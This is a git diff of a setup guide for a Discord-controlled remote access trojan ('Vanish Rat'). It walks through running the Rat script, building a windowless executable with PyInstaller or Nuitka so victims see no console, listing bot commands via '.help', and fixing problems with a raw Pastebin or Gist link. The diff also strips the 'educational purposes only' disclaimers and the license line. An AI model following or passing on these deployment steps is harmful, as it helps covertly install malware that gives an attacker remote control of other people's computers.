@@ -1,11 +1,10 @@
 
 ![discord](https://github.com/user-attachments/assets/341b5144-9c33-40ec-b229-c4ce3ad8a600)
 
-           For educational purposes only!!
-             Discord Rat - Setup Guide
+           
+             Baisc Discord Rat - Setup Guide
 --------------------------------------------------------
 Author  : @deadconvicess | Packaged By: #deadconvicess
-License : MIT
 --------------------------------------------------------
 
  WHAT YOU NEED
@@ -37,7 +36,7 @@ License : MIT
    python Rat.pyw
 
 
- OPTIONAL: BUILDING EXE
+ BUILDING EXE
 ---------------------------------
 For No Console Window:
 - Nuitka: pip install nuitka
@@ -47,12 +46,11 @@ For No Console Window:
 - Pyinstaller --onefile --noconsole Rat.py
 
 
-DISCORD COMMAND PANEL
+DISCORD COMMAND
 ---------------------------
 Once bot is running, type:
    .help
 To view available commands.
-
 
  TROUBLESHOOTING
 -------------------
@@ -60,9 +58,4 @@ To view available commands.
 - Ensure all packages are installed
 - Make sure you used a RAW Pastebin/Gist link
 
-
-ENJOY USING VANISH RAT 1.0 
-
- For educational purposes only!!
---------------------------------------------------------
 
